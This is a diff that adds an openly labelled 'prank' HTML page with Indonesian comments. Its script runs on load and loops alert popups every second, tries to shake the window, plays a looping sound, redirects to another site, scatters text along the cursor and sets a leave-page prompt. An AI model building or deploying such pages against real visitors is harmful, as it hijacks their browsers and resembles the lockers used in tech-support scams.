@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>Ultimate Prank Website - Total Chaos!</title>
+  <style>
+    body {
+      background-color: black;
+      color: lime;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin: 0;
+      height: 100vh;
+      overflow: hidden;
+    }
+    h1 {
+      font-size: 5rem;
+      text-shadow: 5px 5px 10px red;
+      margin-top: 20vh;
+    }
+    p {
+      font-size: 2rem;
+    }
+    .annoying {
+      position: absolute;
+      background-color: red;
+      padding: 10px;
+      color: white;
+      font-size: 1.5rem;
+      border-radius: 10px;
+      animation: moveAround 2s infinite;
+    }
+    @keyframes moveAround {
+      0% {top: 0; left: 0;}
+      25% {top: 0; left: calc(100% - 100px);}
+      50% {top: calc(100% - 50px); left: calc(100% - 100px);}
+      75% {top: calc(100% - 50px); left: 0;}
+      100% {top: 0; left: 0;}
+    }
+  </style>
+</head>
+<body>
+  <h1>It's a trap! 😈</h1>
+  <p>You can't escape now!</p>
+
+  <div class="annoying" id="annoyingBox">Catch Me!</div>
+
+  <script>
+    // Pop-up spam, goyang halaman, dan kursor mengikuti teks
+    function infinitePopups() {
+      alert("You can't close me!");
+      setTimeout(infinitePopups, 1000); // Popup tiap 1 detik
+    }
+
+    // Memutar suara yang tidak bisa dimatikan
+    function playAnnoyingSound() {
+      const audio = new Audio('https://www.soundjay.com/button/beep-10.mp3');
+      audio.loop = true;
+      audio.play();
+    }
+
+    // Goyang halaman
+    function shakePage() {
+      let x = Math.random() * 10 - 5;
+      let y = Math.random() * 10 - 5;
+      window.moveBy(x, y);
+      setTimeout(shakePage, 50); // Goyang setiap 50ms
+    }
+
+    // Menghindari tombol close dengan redirect berulang kali
+    function infiniteRedirect() {
+      setTimeout(() => {
+        window.location.href = "https://clickme.netlify.app"; // Redirect ke situs prank
+      }, 300);
+    }
+
+    // Membuat elemen yang mengikuti kursor
+    document.addEventListener("mousemove", function(e) {
+      const annoyingText = document.createElement('div');
+      annoyingText.innerText = "Follow me!";
+      annoyingText.style.position = "absolute";
+      annoyingText.style.left = e.pageX + "px";
+      annoyingText.style.top = e.pageY + "px";
+      annoyingText.style.color = "yellow";
+      annoyingText.style.fontSize = "24px";
+      document.body.appendChild(annoyingText);
+      setTimeout(() => annoyingText.remove(), 1000);
+    });
+
+    // Blokir tombol close dengan konfirmasi berulang
+    window.onbeforeunload = function() {
+      return "Are you sure you want to leave?";
+    };
+
+    // Gerakkan elemen "Catch Me!" ke berbagai posisi
+    function moveAnnoyingBox() {
+      const box = document.getElementById('annoyingBox');
+      const randomX = Math.random() * (window.innerWidth - 100) + "px";
+      const randomY = Math.random() * (window.innerHeight - 50) + "px";
+      box.style.left = randomX;
+      box.style.top = randomY;
+      setTimeout(moveAnnoyingBox, 1000); // Pindah posisi setiap detik
+    }
+
+    // Jalankan semua fungsi prank
+    infinitePopups();
+    shakePage();
+    playAnnoyingSound();
+    infiniteRedirect();
+    moveAnnoyingBox();
+  </script>
+</body>
+</html>
